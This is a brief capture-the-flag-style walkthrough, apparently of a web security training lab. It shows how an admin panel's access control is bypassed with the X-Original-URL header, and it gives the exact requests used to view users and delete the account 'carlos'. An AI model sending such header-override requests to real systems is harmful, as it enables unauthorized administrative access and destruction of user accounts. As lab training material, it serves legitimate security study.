notice that there is an admin page
when try to access it  -> resoponse -> Access denied

send the admin panel request to the repeater

let's try to use X-Original-URL header

GET / HTTP/2
X-Original-Url: /admin

the bypass worked and we can see the usernames carlos and wiener

at the end of the request there is the delete path to delete carlos and wiener
paths:
/admin/delete?username=wiener
/admin/delete?username=carlos

now let's try to delete carlos account using the header X-Original-Url

request:
GET /?username=carlos HTTP/2
X-Original-Url: /admin/delete

to check if carlos deleted or not access the admin panel again

solved
